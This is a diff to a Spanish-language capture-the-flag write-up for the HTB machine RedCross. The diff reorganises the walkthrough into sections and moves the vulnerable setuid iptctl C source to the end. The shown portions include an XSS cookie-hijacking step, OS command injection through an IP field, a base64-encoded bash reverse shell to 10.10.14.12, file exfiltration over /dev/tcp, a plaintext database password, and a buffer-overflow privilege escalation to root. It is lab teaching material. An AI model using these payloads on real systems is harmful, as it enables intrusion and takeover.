@@ -3,6 +3,8 @@
 
 -----------------------
 
+# Part 1: Enumeración del sistema
+
 Puertos abiertos 22(ssh), 80(http), 443(https). Nmap dice que:
 - Tanto el puerto 80 como el 443 redirigen a intra.redcross.htb
 
@@ -16,7 +18,6 @@ https://intra.redcross.htb/?page=login [200 OK] Apache[2.4.25], Cookies[PHPSESSI
 recross.htb tambíen nos lleva a intra.redcross.
 ![redcross](https://user-images.githubusercontent.com/96772264/202894987-538d0483-3675-45ac-a66c-00cd0454201f.PNG)
 
-
 Loguarnos en el panel de login se tramita como:  
 ```/POST a intra.redcross.htb/pages/actions.php  Cookie: PHPSESSID=isf5g87laf3r3glg34arsoj354 user=admin&pass=admin&action=login.```  
 Al poner creds que no valen dice "Wrong Data"  
@@ -27,6 +28,9 @@ Podriamos intentar fuzzing e inyecciones pero parece que los tiros no van por ah
 Como van a ver nuestra petición se me ocurren un XSS.  
 En el formulario de contacto pone abajo: "Web messaging system 0.3b"  
 ![redcross2](https://user-images.githubusercontent.com/96772264/202894995-c1c0adc3-a29b-4393-a49b-3589f7604e81.PNG)
+
+----------------------------------
+# Part 2: XSS Cookie hijacking
 
 En searchsploit: 
 ```console
@@ -74,6 +78,9 @@ Asi que lo mismo en el python pero añadiendo mas campos:
 ```python
 cookie = {"PHPSESSID":"ta4sbdc0an5jkq215m8q5kq2e5", "LANG":"EN_US", "SINCE":"1668850355", "LIMIT":"10", "DOMAIN":"admin"}
 ```
+----------------------------------
+# Part 3: Entrando en el panel de administración 
+
 Haciendo la petición tenemos un mensaje: 
 ```
 ** Información sobre cuenta de invitado ** De admin(uid 1) para invitado (uid 5)
@@ -109,6 +116,9 @@ En network acces hay una sección llamada "Allow IP Adress", que sirve para abri
 Si volvemos a hacer un escaneo de puertos, vemos que están abiertos también los 21,1025(NFS),5432(postgresSQL):
 Cuando le das a **allow an ip** hay una peticion a ```/POST admin.redcross.htb/pages/actions.php   data -> ip=10.10.14.12&action=Allow+IP```  
 
+----------------------------------
+# Part 4: Inyeccion de comandos al sistema
+
 Si seguimos con el tema del firewall, podriamos intentar un SO command inyection (ya que probablmente esta ip se le pase al comando iptables o 
 cualquier otro, al poner ";" se le concatenaría un segundo comando al sistema)
 ```python3
@@ -137,6 +147,9 @@ YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK
 www-data@redcross:/var/www/html/admin/pages$
 ```
 
+----------------------------------
+# Part 5: Dentro al sistema. Explotación de binarios
+
 En esa misma ruta hay un users.txt con las creds: "$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");"
 Pero por ahora no valen para nada. Subimos nuestro [script de reconocimiento](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh):
 - usuarios: root, penelope (nosotros somos www-data)  
@@ -158,70 +171,7 @@ www-data@redcross:/tmp$ cat < /opt/iptctl/iptctl > /dev/tcp/10.10.14.12/666
 ```
 Si le hacemos un md5sum a ambos binarios (el que hemos traido y el original) vemos que los hashes son iguales por lo que no ha sufrido cambios en 
 el camino
-Este sería el código del programa:
-```c
-// #include de  <stdio.h>, <stdlib.h>, <string.h>, <arpa/inet.h>, <unistd.h>
-#define BUFFSIZE 360
-
-int isValidIpAddress(char *ipAddress)
-{ struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr)); return result != 0; }
-// Si este comando sale bien esque la ip es válida
-
-int isValidAction(char *action){
-    int a=0; char value[10]; strncpy(value,action,9);
-    if(strstr(value,"allow")) a=1;  // Si es restrict accion 2 y si es show la 3
-	return a; }
-
-void cmdAR(char **a, char *action, char *ip){
-    a[0]="/sbin/iptables"; a[1]=action; a[2]="INPUT"; a[3]="-p"; a[4]="all"; a[5]="-s"; a[6]=ip; a[7]="-j"; a[8]="ACCEPT";
-    return;}  // Ej "/sbin/iptables ALLOW -p all -s 10.10.14.12 -j ACCEPT"
-
-void cmdShow(char **a){ a[0]="/sbin/iptables"; a[1]="-L"; a[2]="INPUT"; return;} // O sea "/sbin/iptables -L "
-
-void interactive(char *ip, char *action, char *name){
-    char inputAddress[16]; char inputAction[10]; // Buffers de varaibles accion e ip
-    printf("Entering interactive mode\n"); printf("Action(allow|restrict|show): ");
-    fgets(inputAction,BUFFSIZE,stdin); fflush(stdin);
-    printf("IP address: "); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); // Mete los datos que le damos en los buffers
-    inputAddress[strlen(inputAddress)-1] = 0;
-    if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
-        printf("Usage: %s allow|restrict|show IP\n", name); exit(0); }
-    strcpy(ip, inputAddress); strcpy(action, inputAction); return;}
-
-int main(int argc, char *argv[]){
-    int isAction=0; int isIPAddr=0; pid_t child_pid;
-    char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200];
-	//Definimos algunas variables y buffers de ciertos tamaños
-
-	if(argc!=3 && argc!=2){
-    	printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]); exit(0);} 
-		// Si no hay argumentos nos da el mensaje este y sale. 
-
-	if(argc==2){
-    	if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]); 
-		// Si hay dos argumentos y el primero es -i entramos en modo interactivo "./iptctl -i"
-
-	else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); }
-		// Si hay mas de dos el primero es el modo y el segundo la ip ej "./iptctl allow 127.0.0.1"
-
-	isAction=isValidAction(inputAction);
-	isIPAddr=isValidIpAddress(inputAddress);
-	if(!isAction || !isIPAddr){ printf("Usage: %s allow|restrict|show IP\n", argv[0]); exit(0); }
-
-	puts("DEBUG: All checks passed... Executing iptables");
-	if(isAction==1) cmdAR(args,"-A",inputAddress);
-	if(isAction==2) cmdAR(args,"-D",inputAddress);
-	if(isAction==3) cmdShow(args);
-
-	child_pid=fork();
-	if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0);}
-	else{
-    	if(isAction==1) printf("Network access granted to %s\n",inputAddress);
-    	if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
-    	if(isAction==3) puts("ERR: Function not available!\n");}
-```
-
-En la función de **isValidAction** le pasamos la action y lo mete en un buffer de 10 caracteres ¿Y si hay más?
+Hay una funcion **isValidAction** donde le pasamos la action con el parámetro -i y lo mete en un buffer de 10 caracteres ¿Y si hay más?
 ```console
 └─$ ./iptctl  -i
 Entering interactive mode
@@ -312,4 +262,68 @@ www-data@redcross:/opt/iptctl$ (cat /tmp/text; cat) | ./iptctl -i
 Entering interactive mode
 whoami
 root
+```
+----------------------------
+# Extra: Script en c de iptctl
+
+```c
+// #include de  <stdio.h>, <stdlib.h>, <string.h>, <arpa/inet.h>, <unistd.h>
+#define BUFFSIZE 360
+
+int isValidIpAddress(char *ipAddress)
+{ struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr)); return result != 0; }
+// Si este comando sale bien esque la ip es válida
+
+int isValidAction(char *action){
+    int a=0; char value[10]; strncpy(value,action,9);
+    if(strstr(value,"allow")) a=1;  // Si es restrict accion 2 y si es show la 3
+	return a; }
+
+void cmdAR(char **a, char *action, char *ip){
+    a[0]="/sbin/iptables"; a[1]=action; a[2]="INPUT"; a[3]="-p"; a[4]="all"; a[5]="-s"; a[6]=ip; a[7]="-j"; a[8]="ACCEPT";
+    return;}  // Ej "/sbin/iptables ALLOW -p all -s 10.10.14.12 -j ACCEPT"
+
+void cmdShow(char **a){ a[0]="/sbin/iptables"; a[1]="-L"; a[2]="INPUT"; return;} // O sea "/sbin/iptables -L "
+
+void interactive(char *ip, char *action, char *name){
+    char inputAddress[16]; char inputAction[10]; // Buffers de varaibles accion e ip
+    printf("Entering interactive mode\n"); printf("Action(allow|restrict|show): ");
+    fgets(inputAction,BUFFSIZE,stdin); fflush(stdin);
+    printf("IP address: "); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); // Mete los datos que le damos en los buffers
+    inputAddress[strlen(inputAddress)-1] = 0;
+    if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
+        printf("Usage: %s allow|restrict|show IP\n", name); exit(0); }
+    strcpy(ip, inputAddress); strcpy(action, inputAction); return;}
+
+int main(int argc, char *argv[]){
+    int isAction=0; int isIPAddr=0; pid_t child_pid;
+    char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200];
+	//Definimos algunas variables y buffers de ciertos tamaños
+
+	if(argc!=3 && argc!=2){
+    	printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]); exit(0);} 
+		// Si no hay argumentos nos da el mensaje este y sale. 
+
+	if(argc==2){
+    	if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]); 
+		// Si hay dos argumentos y el primero es -i entramos en modo interactivo "./iptctl -i"
+
+	else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); }
+		// Si hay mas de dos el primero es el modo y el segundo la ip ej "./iptctl allow 127.0.0.1"
+
+	isAction=isValidAction(inputAction);
+	isIPAddr=isValidIpAddress(inputAddress);
+	if(!isAction || !isIPAddr){ printf("Usage: %s allow|restrict|show IP\n", argv[0]); exit(0); }
+
+	puts("DEBUG: All checks passed... Executing iptables");
+	if(isAction==1) cmdAR(args,"-A",inputAddress);
+	if(isAction==2) cmdAR(args,"-D",inputAddress);
+	if(isAction==3) cmdShow(args);
+
+	child_pid=fork();
+	if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0);}
+	else{
+    	if(isAction==1) printf("Network access granted to %s\n",inputAddress);
+    	if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
+    	if(isAction==3) puts("ERR: Function not available!\n");}
 ```
